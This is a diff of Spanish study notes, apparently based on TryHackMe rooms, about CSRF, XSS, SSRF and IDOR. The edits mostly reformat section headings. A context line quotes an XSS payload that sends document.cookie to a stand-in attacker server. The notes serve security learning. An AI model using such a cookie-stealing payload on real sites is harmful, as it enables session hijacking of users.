@@ -182,7 +182,8 @@ Cuando la víctima abre el enlace, el script de JavaScript envía el formulario 
 ---
 <br>
 
-<h2 src="https://cdn-images.tryhackme.com/room-icons/691e303c8bb7e99b93a58132-1775464376816" width="40px">
+<h2>
+  <img src="https://cdn-images.tryhackme.com/room-icons/691e303c8bb7e99b93a58132-1775464376816" width="40px">
   <span> Introducción a XSS (Scripts en Sitios Cruzados)</span>
 </h2>
 
@@ -238,7 +239,13 @@ fetch('http://servidor-atacante.com/log?cookie=' + btoa(document.cookie));
 
 ---
 
-## 4. Introducción a SSRF (Falsificación de Solicitudes en el Servidor)
+<br>
+
+<h2>
+  <img src="https://cdn-images.tryhackme.com/room-icons/268e10b8ee0b53d1074b2a7fd5b1a789.png" width="40px">
+  <span> Introducción a SRF (Falsificación de Solicitudes en el Servidor)</span>
+</h2>
+
 
 ### 4.1 ¿Qué es SSRF y Causa Raíz?
 Server-Side Request Forgery (SSRF) es una vulnerabilidad que permite a un atacante manipular una función de la aplicación web para forzar al servidor backend a realizar peticiones HTTP u otros protocolos hacia direcciones arbitrarias elegidas por el atacante.
@@ -276,7 +283,12 @@ Cuando los desarrolladores aplican listas de denegación (*blacklists*) para blo
 
 ---
 
-## 5. Referencias Directas Inseguras a Objetos (IDOR)
+<br>
+
+<h2>
+  <img src="https://cdn-images.tryhackme.com/room-icons/92b349206a2901c187e32ad074eae45c.png" width="40px">
+  <span> Referencias Directas Inseguras a Objetos (IDOR)</span>
+</h2>
 
 ### 5.1 ¿Qué es IDOR? Autenticación vs. Autorización
 IDOR (Insecure Direct Object Reference) es un tipo de vulnerabilidad de control de acceso a nivel de objeto que ocurre cuando una aplicación utiliza entradas proporcionadas por el usuario para acceder directamente a un recurso o registro en el almacenamiento backend, sin realizar verificaciones suficientes para asegurar que el usuario actual tiene permisos sobre ese recurso.
